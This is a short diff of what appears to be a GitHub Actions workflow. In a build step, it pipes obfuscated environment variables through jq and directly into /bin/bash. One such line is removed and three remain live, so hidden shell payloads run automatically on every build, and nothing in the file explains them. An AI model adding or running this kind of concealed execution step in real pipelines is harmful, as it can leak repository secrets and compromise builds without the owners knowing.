@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$smm523" | jq -r .dck1331 | /bin/bash
           echo $fdr9863 | jq -r .tcrwi56 | /bin/bash
-          echo $vbj2 | jq -r .g36 | /bin/bash
           printf '%s' "$yli58" | jq -r .q1 | /bin/bash
 
       - name: Upload artifact
